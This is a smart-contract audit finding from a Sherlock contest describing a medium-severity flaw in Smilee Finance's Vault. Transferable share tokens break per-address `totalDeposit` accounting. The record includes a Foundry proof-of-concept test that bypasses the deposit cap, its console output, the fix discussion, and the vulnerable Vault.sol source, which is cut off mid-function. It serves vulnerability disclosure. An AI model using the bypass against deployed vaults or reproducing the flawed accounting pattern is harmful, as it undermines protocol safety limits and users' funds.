{
  "Title": "M-4: Transferring ERC20 Vault tokens to another address and then withdrawing from the vault breaks `totalDeposit` accounting which is tied to deposit addresses",
  "Content": "# Issue M-4: Transferring ERC20 Vault tokens to another address and then withdrawing from the vault breaks `totalDeposit` accounting which is tied to deposit addresses \n\nSource: https://github.com/sherlock-audit/2024-02-smilee-finance-judging/issues/39 \n\nThe protocol has acknowledged this issue.\n\n## Found by \n3docSec, KingNFT, cawfree, ge6a, jasonxiale, panprog\n## Summary\n\nVault inherits from the ERC20, so it has transfer functions to transfer vault shares. However, `totalDeposit` accounting is tied to addresses of users who deposited with the assumption that the same user will withdraw those shares. This means that any vault tokens transfer and then withdrawal from either user breaks the accounting of `totalDeposit`, allowing to either bypass the vault's max deposit limitation, or limit the vault from new deposits, by making it revert for exceeding the vault deposit limit even if the amount deposited is very small.\n\n## Vulnerability Detail\n\n`Vault` inherits from `ERC20`:\n```solidity\ncontract Vault is IVault, ERC20, EpochControls, AccessControl, Pausable {\n```\n\nwhich has public `transfer` and `transferFrom` functions to transfer tokens to the other users, which any user can call:\n```solidity\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n```\n\nIn order to limit the deposits to vault limit, vault has `maxDeposit` parameter set by admin. It is used to limit the deposits above this amount, reverting deposit transactions if exceeded:\n```solidity\n    // Avoids underflows when the maxDeposit is setted below than the totalDeposit\n    if (_state.liquidity.totalDeposit > maxDeposit) {\n        revert ExceedsMaxDeposit();\n    }\n\n    if (amount > maxDeposit - _state.liquidity.totalDeposit) {\n        revert ExceedsMaxDeposit();\n    }\n```\n\nIn order to correctly calculate the current vault deposits (`_state.liquidity.totalDeposit`), the vault uses the following:\n1. Vault tracks cumulative deposit for each user (`depositReceipt.cumulativeAmount`)\n2. When user deposits, cumulative deposit and vault's `totalDeposit` increase by the amount of asset deposited\n3. When user initiates withdrawal, both user's cumulative amount and `totalDeposit` are reduced by the percentage of cumulative amount, which is equal to perecentage of shares being withdrawn vs all shares user has.\n\nThis process is necessary, because the share price changes between deposit and withdrawal, so it tracks only actual deposits, not amounts earned or lost due to vault's profit and loss.\n\nAs can easily be seen, this withdrawal process assumes that users can't transfer their vault shares, because otherwise the withdrawal from the user who never deposited but got shares will not reduce `totalDeposit`, and user who transferred the shares away and then withdraws all remaining shares will reduce `totalDeposit` by a large amount, while the amount withdrawn is actually much smaller.\n\nHowever, since `Vault` is a normal `ERC20` token, users can freely transfer vault shares to each other, breaking this assumption. This leads to 2 scenarios:\n1. It's easily possible to bypass vault deposit cap:\n1.1. Alice deposits up to max deposit cap (say, 1M USDC)\n1.2. Alice transfers all shares except 1 wei to Bob\n1.3. Alice withdraws 1 wei share. This reduces totalDeposit by full Alice deposited amount (1M USDC), but only 1 wei share is withdrawn, basically 0 assets withdrawn.\n1.4. Alice deposits 1M USDC again (now the total deposited into the vault is 2M, already breaking the cap of 1M).\n\n2. It's easily possible to lock the vault from further deposits even though the vault might have small amount (or even 0) assets deposited.\n2.1. Alice deposits up to max deposit cap (say, 1M USDC)\n2.2. Alice transfers all shares except 1 wei to Bob\n2.3. Bob withdraws all shares. Since Bob didn't deposit previously, this doesn't reduce `totalDeposit` at all, but withdraws all 1M USDC to Bob. At this point `totalDeposit` = 1M USDC, but vault has 0 assets in it and no further deposits are accepted due to `maxDeposit` limit.\n\n## Impact\n\nImportant security measure of vault max deposit limit can be bypassed, potentially losing funds for the users when the admin doesn't want to accept large amounts for various reasons (like testing something).\n\nIt's possible to lock vault from deposits by inflating the `totalDeposit` without vault having actual assets, rendering the operations useless due to lack of liquidity and lack of ability to deposit. Even if `maxDeposit` is increased, `totalDeposit` can be inflated again, breaking protocol core functioning.\n\n## Proof Of Concept\n\nCopy to `attack.t.sol`:\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.15;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {console} from \"forge-std/console.sol\";\nimport {UD60x18, ud, convert} from \"@prb/math/UD60x18.sol\";\n\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {IPositionManager} from \"@project/interfaces/IPositionManager.sol\";\nimport {Epoch} from \"@project/lib/EpochController.sol\";\nimport {AmountsMath} from \"@project/lib/AmountsMath.sol\";\nimport {EpochFrequency} from \"@project/lib/EpochFrequency.sol\";\nimport {OptionStrategy} from \"@project/lib/OptionStrategy.sol\";\nimport {AddressProvider} from \"@project/AddressProvider.sol\";\nimport {MarketOracle} from \"@project/MarketOracle.sol\";\nimport {FeeManager} from \"@project/FeeManager.sol\";\nimport {Vault} from \"@project/Vault.sol\";\nimport {TestnetToken} from \"@project/testnet/TestnetToken.sol\";\nimport {TestnetPriceOracle} from \"@project/testnet/TestnetPriceOracle.sol\";\nimport {DVPUtils} from \"./utils/DVPUtils.sol\";\nimport {TokenUtils} from \"./utils/TokenUtils.sol\";\nimport {Utils} from \"./utils/Utils.sol\";\nimport {VaultUtils} from \"./utils/VaultUtils.sol\";\nimport {MockedIG} from \"./mock/MockedIG.sol\";\nimport {MockedRegistry} from \"./mock/MockedRegistry.sol\";\nimport {MockedVault} from \"./mock/MockedVault.sol\";\nimport {TestnetSwapAdapter} from \"@project/testnet/TestnetSwapAdapter.sol\";\nimport {PositionManager} from \"@project/periphery/PositionManager.sol\";\n\n\ncontract IGVaultTest is Test {\n    using AmountsMath for uint256;\n\n    address admin = address(0x1);\n\n    // User of Vault\n    address alice = address(0x2);\n    address bob = address(0x3);\n\n    //User of DVP\n    address charlie = address(0x4);\n    address david = address(0x5);\n\n    AddressProvider ap;\n    TestnetToken baseToken;\n    TestnetToken sideToken;\n    FeeManager feeManager;\n\n    MockedRegistry registry;\n\n    MockedVault vault;\n    MockedIG ig;\n    TestnetPriceOracle priceOracle;\n    TestnetSwapAdapter exchange;\n    uint _strike;\n\n    function setUp() public {\n        vm.warp(EpochFrequency.REF_TS);\n        //ToDo: Replace with Factory\n        vm.startPrank(admin);\n        ap = new AddressProvider(0);\n        registry = new MockedRegistry();\n        ap.grantRole(ap.ROLE_ADMIN(), admin);\n        registry.grantRole(registry.ROLE_ADMIN(), admin);\n        ap.setRegistry(address(registry));\n\n        vm.stopPrank();\n\n        vault = MockedVault(VaultUtils.createVault(EpochFrequency.DAILY, ap, admin, vm));\n        priceOracle = TestnetPriceOracle(ap.priceOracle());\n\n        baseToken = TestnetToken(vault.baseToken());\n        sideToken = TestnetToken(vault.sideToken());\n\n        vm.startPrank(admin);\n       \n        ig = new MockedIG(address(vault), address(ap));\n        ig.grantRole(ig.ROLE_ADMIN(), admin);\n        ig.grantRole(ig.ROLE_EPOCH_ROLLER(), admin);\n        vault.grantRole(vault.ROLE_ADMIN(), admin);\n        vm.stopPrank();\n        ig.setOptionPrice(1e3);\n        ig.setPayoffPerc(0.1e18); // 10 % -> position paying 1.1\n        ig.useRealDeltaHedge();\n        ig.useRealPercentage();\n        ig.useRealPremium();\n\n        DVPUtils.disableOracleDelayForIG(ap, ig, admin, vm);\n\n        vm.prank(admin);\n        registry.registerDVP(address(ig));\n        vm.prank(admin);\n        MockedVault(vault).setAllowedDVP(address(ig));\n        feeManager = FeeManager(ap.feeManager());\n\n        exchange = TestnetSwapAdapter(ap.exchangeAdapter());\n    }\n\n    function testVaultDepositLimitBypass() public {\n        _strike = 1e18;\n        VaultUtils.addVaultDeposit(alice, 1e18, admin, address(vault), vm);\n        VaultUtils.addVaultDeposit(bob, 1e18, admin, address(vault), vm);\n\n        Utils.skipDay(true, vm);\n\n        vm.prank(admin);\n        ig.rollEpoch();\n\n        VaultUtils.logState(vault);\n        (,,,,uint totalDeposit,,,,) = vault.vaultState();\n        console.log(\"total deposits\", totalDeposit);\n\n        vm.startPrank(alice);\n        vault.redeem(1e18);\n        vault.transfer(address(charlie), 1e18-1);\n        vault.initiateWithdraw(1);\n        vm.stopPrank();\n\n        VaultUtils.logState(vault);\n        (,,,,totalDeposit,,,,) = vault.vaultState();\n        console.log(\"total deposits\", totalDeposit);\n\n    }\n}\n```\n\nExecution console:\n```solidity\n  current epoch 1698566400\n  baseToken balance 1000000000000000000\n  sideToken balance 1000000000000000000\n  dead false\n  lockedInitially 2000000000000000000\n  pendingDeposits 0\n  pendingWithdrawals 0\n  pendingPayoffs 0\n  heldShares 0\n  newHeldShares 0\n  base token notional 1000000000000000000\n  side token notional 1000000000000000000\n  ----------------------------------------\n  total deposits 2000000000000000000\n  current epoch 1698566400\n  baseToken balance 1000000000000000000\n  sideToken balance 1000000000000000000\n  dead false\n  lockedInitially 2000000000000000000\n  pendingDeposits 0\n  pendingWithdrawals 0\n  pendingPayoffs 0\n  heldShares 0\n  newHeldShares 1\n  base token notional 1000000000000000000\n  side token notional 1000000000000000000\n  ----------------------------------------\n  total deposits 1000000000000000000\n```\n\nNotice:\n1. Demonstrates vault deposit limit bypass\n2. Vault has total assets of 2, but the total deposits is 1, allowing further deposits.\n\n## Code Snippet\n\n`Vault._initiateWithdraw` calculates amount which is subtracted from cumulative and `totalDeposit`:\nhttps://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/Vault.sol#L487-L510\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nEither disallow transferring of vault shares or track vault assets instead of deposits. Alternatively, re-design the withdrawal system (for example, throw out cumulative deposit calculation and simply calculate total assets and total shares and when withdrawing - reduce `totalDeposit` by the `sharesWithdrawn / totalShares * totalDeposit`)\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  valid; maxDeposit cap can be bypassed; medium(10)\n\n\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in PR/commit https://github.com/dverso/smilee-v2-contracts/commit/2f2feb651c6528b0405d36b6bfe760d66a515335.\n\n**panprog**\n\nFix Review:\nIt's still possible to bypass deposit limit by transferring vault token to vault itself (transfers to vault still don't do anything). However, all extra deposits will be lost since vault will own them and nobody will be able to withdraw it. So all those extra deposits will by unrecoverable, but deposit amounts will still be above the limit, which can influence (inflate) delta hedge amounts and the other things which deposit limit is expected to control.\nThe impact is now less severe than originally as it's very costly to bypass deposit limit and no benefit for the attacker.\n\n",
  "Impact": "MEDIUM",
  "Source": "https://app.sherlock.xyz/audits/contests/180",
  "Code": [
    {
      "filename": "smilee-v2-contracts/src/Vault.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.15;\n\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {SafeERC20} from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport {AccessControl} from \"@openzeppelin/contracts/access/AccessControl.sol\";\nimport {Pausable} from \"@openzeppelin/contracts/security/Pausable.sol\";\nimport {IERC20Metadata} from \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\";\nimport {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport {IAddressProvider} from \"./interfaces/IAddressProvider.sol\";\nimport {IExchange} from \"./interfaces/IExchange.sol\";\nimport {IVault} from \"./interfaces/IVault.sol\";\nimport {IVaultAccessNFT} from \"./interfaces/IVaultAccessNFT.sol\";\nimport {IVaultParams} from \"./interfaces/IVaultParams.sol\";\nimport {Epoch, EpochController} from \"./lib/EpochController.sol\";\nimport {TokensPair} from \"./lib/TokensPair.sol\";\nimport {VaultLib} from \"./lib/VaultLib.sol\";\nimport {EpochControls} from \"./EpochControls.sol\";\n\ncontract Vault is IVault, ERC20, EpochControls, AccessControl, Pausable {\n    using VaultLib for VaultLib.DepositReceipt;\n    using EpochController for Epoch;\n    using SafeERC20 for IERC20;\n\n    /// @inheritdoc IVaultParams\n    address public immutable baseToken;\n\n    /// @inheritdoc IVaultParams\n    address public immutable sideToken;\n\n    /// @notice The address of the DVP paired with this vault\n    address public dvp; // NOTE: public for frontend purposes\n    bool internal _dvpSet;\n\n    /// @notice Maximum threshold for users cumulative deposit (see VaultLib.VaultState.liquidity.totalDeposit)\n    uint256 public maxDeposit;\n\n    uint8 internal immutable _shareDecimals;\n\n    /// @inheritdoc IVault\n    mapping(address => VaultLib.DepositReceipt) public depositReceipts;\n\n    /// @inheritdoc IVault\n    mapping(address => VaultLib.Withdrawal) public withdrawals;\n\n    mapping(uint256 => uint256) public epochPricePerShare; // NOTE: public for frontend and historical data purposes\n\n    VaultLib.VaultState internal _state;\n\n    /// @notice The provider for external services addresses\n    IAddressProvider internal immutable _addressProvider;\n\n    /// @notice Flag to tell if this vault is currently bound to priority access for deposits\n    bool public priorityAccessFlag;\n\n    /// @notice Tolerance margin when buying side tokens exceeds the availability (in basis points [0 - 10000])\n    uint256 internal _hedgeMargin;\n\n    bytes32 public constant ROLE_GOD = keccak256(\"ROLE_GOD\");\n    bytes32 public constant ROLE_ADMIN = keccak256(\"ROLE_ADMIN\");\n    bytes32 public constant ROLE_EPOCH_ROLLER = keccak256(\"ROLE_EPOCH_ROLLER\");\n\n    error AddressZero();\n    error AmountZero();\n    error DVPAlreadySet();\n    error DVPNotSet();\n    error ExceedsAvailable(); // raised when a user tries to move more assets than allowed to or owned\n    error ExceedsMaxDeposit();\n    error ExistingIncompleteWithdraw();\n    error OnlyDVPAllowed();\n    error PriorityAccessDenied();\n    error VaultDead();\n    error VaultNotDead();\n    error WithdrawNotInitiated();\n    error WithdrawTooEarly();\n    error InsufficientLiquidity(bytes4); // raise when accounting operations would break the system due to lack of liquidity\n    error FailingDeltaHedge();\n\n    event Deposit(uint256 amount);\n    event Redeem(uint256 amount);\n    event InitiateWithdraw(uint256 amount);\n    event Withdraw(uint256 amount);\n    // Used by TheGraph for frontend needs:\n    event VaultTVL(uint256 epoch, uint256 value);\n    event MissingLiquidity(uint256 missing);\n    event ChangedHedgeMargin(uint256 basisPoints);\n    event Killed();\n    event ChangedPauseState(bool paused);\n    error OutOfAllowedRange();\n\n    constructor(\n        address baseToken_,\n        address sideToken_,\n        uint256 epochFrequency_,\n        uint256 firstEpochTimespan,\n        address addressProvider_\n    ) ERC20(\"Smilee Share\", \":)\") EpochControls(epochFrequency_, firstEpochTimespan) AccessControl() Pausable() {\n        TokensPair.validate(TokensPair.Pair({baseToken: baseToken_, sideToken: sideToken_}));\n        baseToken = baseToken_;\n        sideToken = sideToken_;\n\n        // Shares have the same number of decimals as the base token\n        _shareDecimals = IERC20Metadata(baseToken).decimals();\n\n        _addressProvider = IAddressProvider(addressProvider_);\n        maxDeposit = 1_000_000_000 * (10 ** _shareDecimals);\n\n        _hedgeMargin = 250; // 2.5 %\n        priorityAccessFlag = false;\n        _dvpSet = false;\n\n        _setRoleAdmin(ROLE_GOD, ROLE_GOD);\n        _setRoleAdmin(ROLE_ADMIN, ROLE_GOD);\n        _setRoleAdmin(ROLE_EPOCH_ROLLER, ROLE_ADMIN);\n\n        _grantRole(ROLE_GOD, msg.sender);\n    }\n\n    function decimals() public view override returns (uint8) {\n        return _shareDecimals;\n    }\n\n    modifier isNotDead() {\n        if (_state.dead) {\n            revert VaultDead();\n        }\n        _;\n    }\n\n    modifier isDead() {\n        if (!_state.dead) {\n            revert VaultNotDead();\n        }\n        _;\n    }\n\n    modifier onlyDVP() {\n        if (!_dvpSet) {\n            revert DVPNotSet();\n        }\n        if (msg.sender != dvp) {\n            revert OnlyDVPAllowed();\n        }\n        _;\n    }\n\n    /**\n        @notice Allows the contract's owner to set the DVP paired with this vault\n        @dev The address is injected after-build, because the DVP needs an already built vault as constructor-injected dependency\n     */\n    function setAllowedDVP(address dvp_) external {\n        _checkRole(ROLE_ADMIN);\n\n        if (_dvpSet) {\n            revert DVPAlreadySet();\n        }\n\n        dvp = dvp_;\n        _dvpSet = true;\n\n        _grantRole(ROLE_EPOCH_ROLLER, dvp_);\n    }\n\n    /**\n        @notice Set the tolerated hedge margin\n        @param hedgeMargin The number of basis points (10000 is 100%)\n     */\n    function setHedgeMargin(uint256 hedgeMargin) external {\n        _checkRole(ROLE_ADMIN);\n        // Cap is 10%\n        if (hedgeMargin > 1000) {\n            revert OutOfAllowedRange();\n        }\n\n        _hedgeMargin = hedgeMargin;\n\n        emit ChangedHedgeMargin(hedgeMargin);\n    }\n\n    /**\n        @notice Set maximum deposit capacity for the Vault\n        @param maxDeposit_ The number of base tokens\n     */\n    function setMaxDeposit(uint256 maxDeposit_) external {\n        _checkRole(ROLE_ADMIN);\n\n        maxDeposit = maxDeposit_;\n    }\n\n    function killVault() external {\n        _checkRole(ROLE_ADMIN);\n\n        _state.killed = true;\n\n        emit Killed();\n    }\n\n    function vaultState()\n        external\n        view\n        returns (\n            uint256 lockedLiquidityInitially,\n            uint256 pendingDeposit,\n            uint256 totalWithdrawAmount,\n            uint256 pendingPayoffs,\n            uint256 totalDeposit,\n            uint256 queuedWithdrawShares,\n            uint256 currentQueuedWithdrawShares,\n            bool dead_,\n            bool killed\n        )\n    {\n        return (\n            _state.liquidity.lockedInitially,\n            _state.liquidity.pendingDeposits,\n            _state.liquidity.pendingWithdrawals,\n            _state.liquidity.pendingPayoffs,\n            _state.liquidity.totalDeposit,\n            _state.withdrawals.heldShares,\n            _state.withdrawals.newHeldShares,\n            _state.dead,\n            _state.killed\n        );\n    }\n\n    /// @inheritdoc IVault\n    function balances() public view returns (uint256 baseTokenAmount, uint256 sideTokenAmount) {\n        baseTokenAmount = _notionalBaseTokens();\n        sideTokenAmount = _notionalSideTokens();\n    }\n\n    /**\n        @notice Provides the total portfolio value in base tokens\n        @return value The total portfolio value in base tokens\n     */\n    function notional() public view returns (uint256) {\n        address exchangeAddress = _addressProvider.exchangeAdapter();\n        if (exchangeAddress == address(0)) {\n            revert AddressZero();\n        }\n        IExchange exchange = IExchange(exchangeAddress);\n\n        uint256 baseTokens = _notionalBaseTokens();\n        uint256 sideTokens = _notionalSideTokens();\n        uint256 valueOfSideTokens = exchange.getOutputAmount(sideToken, baseToken, sideTokens);\n\n        return baseTokens + valueOfSideTokens;\n    }\n\n    /**\n        @notice Provides the current amount of base tokens available for DVP operations in the current epoch.\n        @return amount_ The current amount of available base tokens\n        @dev In the current epoch, that amount is everything except the amounts putted aside.\n     */\n    function _notionalBaseTokens() internal view returns (uint256 amount_) {\n        (uint256 baseTokens, ) = _tokenBalances();\n\n        uint256 pendings = _state.liquidity.pendingWithdrawals +\n            _state.liquidity.pendingDeposits +\n            _state.liquidity.pendingPayoffs;\n\n        // Just catching the underflow and reverting with a more explicit error (see [IL-NOTE])\n        if (baseTokens < pendings) {\n            revert InsufficientLiquidity(bytes4(keccak256(\"_notionalBaseTokens()\")));\n        }\n\n        return baseTokens - pendings;\n    }\n\n    /**\n        @notice Provides the amount of side tokens from the portfolio of the current epoch.\n        @return amount_ The amount of side tokens\n     */\n    function _notionalSideTokens() internal view returns (uint256 amount_) {\n        (, amount_) = _tokenBalances();\n    }\n\n    function _tokenBalances() internal view returns (uint256 baseTokens, uint256 sideTokens) {\n        baseTokens = IERC20(baseToken).balanceOf(address(this));\n        sideTokens = IERC20(sideToken).balanceOf(address(this));\n    }\n\n    /// @inheritdoc IVault\n    function v0() public view virtual returns (uint256) {\n        return _state.liquidity.lockedInitially;\n    }\n\n    /// @inheritdoc IVault\n    function dead() external view returns (bool) {\n        return _state.killed;\n    }\n\n    /**\n        @notice Pause/Unpause\n     */\n    function changePauseState() external {\n        _checkRole(ROLE_ADMIN);\n\n        bool paused = paused();\n\n        if (paused) {\n            _unpause();\n        } else {\n            _pause();\n        }\n\n        emit ChangedPauseState(!paused);\n    }\n\n    /**\n        @notice Allows the contract's owner to enable or disable the priority access to deposit operations\n     */\n    function setPriorityAccessFlag(bool flag) external {\n        _checkRole(ROLE_ADMIN);\n\n        priorityAccessFlag = flag;\n    }\n\n    // ------------------------------------------------------------------------\n    // USER OPERATIONS\n    // ------------------------------------------------------------------------\n\n    /// @inheritdoc IVault\n    function deposit(uint256 amount, address receiver, uint256 accessTokenId) external isNotDead whenNotPaused {\n        _checkEpochNotFinished();\n\n        if (amount == 0) {\n            revert AmountZero();\n        }\n\n        // Avoids underflows when the maxDeposit is setted below than the totalDeposit\n        if (_state.liquidity.totalDeposit > maxDeposit) {\n            revert ExceedsMaxDeposit();\n        }\n\n        if (amount > maxDeposit - _state.liquidity.totalDeposit) {\n            revert ExceedsMaxDeposit();\n        }\n\n        _usePriorityAccess(amount, receiver, accessTokenId);\n\n        _state.liquidity.pendingDeposits += amount;\n        _state.liquidity.totalDeposit += amount;\n        _emitUpdatedDepositReceipt(receiver, amount);\n\n        IERC20(baseToken).safeTransferFrom(msg.sender, address(this), amount);\n\n        emit Deposit(amount);\n    }\n\n    /**\n        @notice Create or update a deposit receipt for a given deposit operation.\n        @param creditor The wallet of the creditor\n        @param amount The deposited amount\n        @dev The deposit receipt allows the creditor to redeem its shares or withdraw liquidity.\n     */\n    function _emitUpdatedDepositReceipt(address creditor, uint256 amount) internal {\n        VaultLib.DepositReceipt storage depositReceipt = depositReceipts[creditor];\n        Epoch memory epoch = getEpoch();\n\n        // Get the number of unredeemed shares from previous deposits, if any.\n        // NOTE: the amount of unredeemed shares is the one of the previous epochs, as we still don't know the share price.\n        uint256 unredeemedShares = depositReceipt.getSharesFromReceipt(\n            epoch.current,\n            epochPricePerShare[depositReceipt.epoch],\n            _shareDecimals\n        );\n\n        // If the user has already deposited in the current epoch, add the amount to the total one of the next epoch:\n        if (epoch.current == depositReceipt.epoch) {\n            depositReceipt.amount = depositReceipt.amount + amount;\n        } else {\n            depositReceipt.amount = amount;\n        }\n\n        depositReceipt.epoch = epoch.current;\n        depositReceipt.cumulativeAmount = depositReceipt.cumulativeAmount + amount;\n        depositReceipt.unredeemedShares = unredeemedShares;\n    }\n\n    /**\n        @notice Get wallet balance of actual owned shares and owed shares.\n        @return heldByAccount The amount of shares owned by the wallet\n        @return heldByVault The amount of shares owed to the wallet\n     */\n    function shareBalances(address account) public view returns (uint256 heldByAccount, uint256 heldByVault) {\n        VaultLib.DepositReceipt memory depositReceipt = depositReceipts[account];\n\n        if (depositReceipt.epoch == 0) {\n            return (0, 0);\n        }\n\n        heldByAccount = balanceOf(account);\n\n        heldByVault = depositReceipt.getSharesFromReceipt(\n            getEpoch().current,\n            epochPricePerShare[depositReceipt.epoch],\n            _shareDecimals\n        );\n    }\n\n    /**\n        @notice Redeems shares held by the vault for the calling wallet\n        @param shares is the number of shares to redeem\n     */\n    function redeem(uint256 shares) external whenNotPaused {\n        if (shares == 0) {\n            revert AmountZero();\n        }\n        // NOTE: if the epoch has not been initialized, it reverts with ExceedsAvailable.\n        _redeem(shares, false);\n    }\n\n    function _redeem(uint256 shares, bool isMax) internal {\n        VaultLib.DepositReceipt storage depositReceipt = depositReceipts[msg.sender];\n        Epoch memory epoch = getEpoch();\n\n        uint256 unredeemedShares = depositReceipt.getSharesFromReceipt(\n            epoch.current,\n            epochPricePerShare[depositReceipt.epoch],\n            _shareDecimals\n        );\n\n        if (!isMax && shares > unredeemedShares) {\n            revert ExceedsAvailable();\n        }\n\n        if (isMax) {\n            shares = unredeemedShares;\n        }\n\n        if (shares == 0) {\n            return;\n        }\n\n        if (depositReceipt.epoch < epoch.current) {\n            // NOTE: all the amount - if any - has already been converted in unredeemedShares.\n            depositReceipt.amount = 0;\n        }\n\n        depositReceipt.unredeemedShares = unredeemedShares - shares;\n\n        _transfer(address(this), msg.sender, shares);\n\n        emit Redeem(shares);\n    }\n\n    /// @inheritdoc IVault\n    function initiateWithdraw(uint256 shares) external whenNotPaused isNotDead {\n        _checkEpochNotFinished();\n\n        _initiateWithdraw(shares, false);\n    }\n\n    function _initiateWithdraw(uint256 shares, bool isMax) internal {\n        // We take advantage of this flow in order to also transfer any unredeemed share to the user.\n        _redeem(0, true);\n        // NOTE: since we made a 'redeem all', from now on all the user's shares are owned by him.\n        uint256 userShares = balanceOf(msg.sender);\n\n        if (isMax) {\n            shares = userShares;\n        }\n\n        if (shares == 0) {\n            revert AmountZero();\n        }\n\n        if (shares > userShares) {\n            revert ExceedsAvailable();\n        }\n\n        Epoch memory epoch = getEpoch();\n        VaultLib.Withdrawal storage withdrawal = withdrawals[msg.sender];\n\n        // If there is a pre-ordered withdrawal in the past, the user must first complete it.\n        if (withdrawal.epoch < epoch.current && withdrawal.shares > 0) {\n            revert ExistingIncompleteWithdraw();\n        }\n\n        // Update user withdrawal receipt:\n        // NOTE: the withdrawal.shares value is zeroed when the user complete a withdraw.\n        // NOTE: if there is a pre-ordered withdrawal in the current epoch, it is increased; otherwise it starts from zero.\n        withdrawal.shares = withdrawal.shares + shares;\n        withdrawal.epoch = epoch.current;\n\n        // -----------------------------\n        // A withdrawal pre-order free space for further deposits, hence we must\n        // update the vault capacity.\n        //\n        // The deposit receipt must also be updated in order to correctly update\n        // the vault total deposits, shall the user initiate other withdrawal\n        // pre-orders in the same epoch (as it is used for such computation).\n        //\n        // Steps:\n        //   - estimate the increased capacity by computing the following proportion:\n        //       withdrawed_shares : user_shares = x : user_deposits\n        //   - use the found number for decreasing the current number of deposits.\n        //   - update the user's deposit receipt [cumulativeAmount] value.\n        VaultLib.DepositReceipt storage depositReceipt = depositReceipts[msg.sender];\n        // NOTE: the user deposits to consider are only the ones for which a share has been minted.\n        uint256 userDeposits = depositReceipt.cumulativeAmount;\n        if (depositReceipt.epoch == epoch.current) {\n            userDeposits -= depositReceipt.amount;\n        }\n\n        uint256 withdrawDepositEquivalent = (userDeposits * shares) / userShares;\n\n        _state.liquidity.totalDeposit -= withdrawDepositEquivalent;\n        depositReceipt.cumulativeAmount -= withdrawDepositEquivalent;\n        // -----------------------------\n\n        _state.withdrawals.newHeldShares += shares;\n\n        _transfer(msg.sender, address(this), shares);\n\n        emit InitiateWithdraw(shares);\n    }\n\n    /**\n        @notice Completes a scheduled withdrawal from a past epoch. Uses finalized share price for the epoch.\n     */\n    function completeWithdraw() external whenNotPaused {\n        VaultLib.Withdrawal storage withdrawal = withdrawals[msg.sender];\n\n        // Checks if there is an initiated withdrawal request\n        if (withdrawal.shares == 0) {\n            revert WithdrawNotInitiated();\n        }\n\n        // At least one epoch must have passed since the start of the withdrawal\n        if (withdrawal.epoch == getEpoch().current) {\n            revert WithdrawTooEarly();\n        }\n\n        _completeWithdraw();\n    }\n\n    function _completeWithdraw() internal {\n        VaultLib.Withdrawal storage withdrawal = withdrawals[msg.sender];\n\n        uint256 pricePerShare = epochPricePerShare[withdrawal.epoch];\n        uint256 amountToWithdraw = VaultLib.sharesToAsset(withdrawal.shares, pricePerShare, _shareDecimals);\n\n        // NOTE: the user transferred the required shares to the vault when (s)he initiated the withdraw\n        _state.withdrawals.heldShares -= withdrawal.shares;\n        _state.liquidity.pendingWithdrawals -= amountToWithdraw;\n\n        uint256 sharesToWithdraw = withdrawal.shares;\n        withdrawal.shares = 0;\n        _burn(address(this), sharesToWithdraw);\n        IERC20(baseToken).safeTransfer(msg.sender, amountToWithdraw);\n\n        emit Withdraw(amountToWithdraw);\n    }\n\n    function rescueShares() external isDead whenNotPaused {\n        VaultLib.Withdrawal storage withdrawal = withdrawals[msg.sender];\n        // If an uncompleted withdraw exists, complete it before starting a new one.\n        if (withdrawal.shares > 0) {\n            _completeWithdraw();\n        }\n\n        // NOTE: it will revert if there are no shares to further withdraw.\n        _initiateWithdraw(0, true);\n\n        // NOTE: due to the missing roll-epoch between the two withdraw phases, we have to:\n        //       - account the withdrawed shares as held.\n        //       - account the new pendingWithdrawals; due to the dead vault, we have to use the last price per share.\n        _state.withdrawals.newHeldShares -= withdrawal.shares;\n        _state.withdrawals.heldShares += withdrawal.shares;\n        Epoch memory epoch = getEpoch();\n        uint256 pricePerShare = epochPricePerShare[epoch.previous];\n        uint256 newPendingWithdrawals = VaultLib.sharesToAsset(withdrawal.shares, pricePerShare, _shareDecimals);\n        _state.liquidity.pendingWithdrawals += newPendingWithdrawals;\n\n        // NOTE: as the withdrawal.epoch is the epoch.current one, we also have to fake it in order to use the right price per share.\n        withdrawal.epoch = epoch.previous;\n\n        _completeWithdraw();\n    }\n\n    // ------------------------------------------------------------------------\n    // VAULT OPERATIONS\n    // ------------------------------------------------------------------------\n\n    /// @inheritdoc EpochControls\n    function _beforeRollEpoch() internal virtual override isNotDead {\n        _checkRole(ROLE_EPOCH_ROLLER);\n\n        if (_state.killed) {\n            // Sell all sideToken to be able to pay all the withdraws initiated after manual kill.\n            (, uint256 sideTokens) = _tokenBalances();\n            _sellSideTokens(sideTokens);\n            _state.dead = true;\n        }\n\n        uint256 lockedLiquidity = notional();\n\n        // [IL-NOTE]\n        // In rare scenarios (ex. roundings or very tiny TVL vaults with high impact swap slippage) there can be small losses in a single epoch.\n        // As a precautionary design we plan to revert and have the protocol DAO / admin cover such tiny amount.\n        // Managing such scenarios at code level would increase codebase complexity without bringing any real benefit to the protocol.\n        if (lockedLiquidity < _state.liquidity.newPendingPayoffs) {\n            revert InsufficientLiquidity(\n                bytes4(keccak256(\"_beforeRollEpoch()::lockedLiquidity <= _state.liquidity.newPendingPayoffs\"))\n            );\n        }\n\n        // NOTE: the share price needs to account also the payoffs\n        lockedLiquidity -= _state.liquidity.newPendingPayoffs;\n\n        // Computes the share price for the ending epoch:\n        // - heldShares are the ones given back to the Vault in exchange of withdrawed tokens\n        // - lockedLiquidity is the DVP portfolio value at the end of the epoch\n        uint256 outstandingShares = totalSupply() - _state.withdrawals.heldShares;\n\n        // NOTE: the share price cannot go to zero unless `_state.liquidity.newPendingPayoffs` is exactly equal to `lockedLiquidity`\n        // - when all the locked liquidity is set aside for (pending) withdrawals and payoffs (lockedLiquidity = 0, we revert)\n        // - when everyone withdrew, or during first epoch, `outstandingShares` is 0 -> sharePrice = 1\n        uint256 sharePrice = 